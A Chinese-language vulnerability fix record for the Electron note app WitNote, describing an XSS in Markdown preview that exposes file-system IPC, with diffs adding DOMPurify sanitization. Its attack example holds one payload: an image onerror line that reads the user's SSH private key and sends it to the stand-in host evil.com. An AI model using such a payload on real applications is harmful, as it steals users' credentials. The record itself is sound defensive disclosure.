# 安全漏洞修复记录

## CVE-equivalent：Markdown 预览 XSS + IPC 攻击

**修复日期：** 2026-08-24
**严重程度：** 高危
**影响版本：** ≤ v1.3.3

### 漏洞描述

WitNote 是 Electron 应用，渲染进程（Renderer）通过 `contextBridge` 暴露了完整的文件系统 IPC 接口（`window.fs.*`），包括任意文件的读取、写入、删除。

`Editor.tsx` 和 `AIDialog.tsx` 中的 Markdown 渲染函数直接使用 `marked()` 将 Markdown 转为 HTML，未经 DOMPurify 净化，随后将结果通过 `dangerouslySetInnerHTML` 注入 DOM。

攻击者可构造含有恶意 HTML 的 `.md` 文件（如图片 `onerror` 事件、内联脚本等），当用户打开该文件并切换到预览模式时，XSS 代码执行，可调用 `window.fs.*` IPC 接口读写用户任意文件。

### 攻击示例

```html
<!-- 写入恶意 .md 文件，用户预览时触发 -->
<img src=x onerror="window.fs.readFile('/Users/victim/.ssh/id_rsa')
  .then(d => fetch('https://evil.com?k=' + encodeURIComponent(d)))">
```

### 修复方案

在 `renderMarkdown()` 函数输出前加入 `DOMPurify.sanitize()`：

**`src/components/Editor.tsx`**
```diff
+ import DOMPurify from 'dompurify'

  const renderMarkdown = (md: string): string => {
      try {
          let html = marked(md) as string
          html = renderLatex(html)
-         return html
+         return DOMPurify.sanitize(html, {
+             ADD_ATTR: ['class'],
+             ALLOW_DATA_ATTR: false,
+         })
      } catch {
-         return md
+         return DOMPurify.sanitize(md)
      }
  }
```

**`src/components/AIDialog.tsx`**
```diff
+ import DOMPurify from 'dompurify'

  const renderMarkdown = (text: string) => {
      try {
          const html = marked.parse(text, { async: false }) as string
-         return html
+         return DOMPurify.sanitize(html, { ADD_ATTR: ['class'] })
      } catch {
-         return text
+         return DOMPurify.sanitize(text)
      }
  }
```

`dompurify@3.3.1` 已在 `package.json` 中安装，无需新增依赖。

### 未受影响

`ChatPanel.tsx` 在修复前已正确使用 `DOMPurify.sanitize()`，不受此漏洞影响。
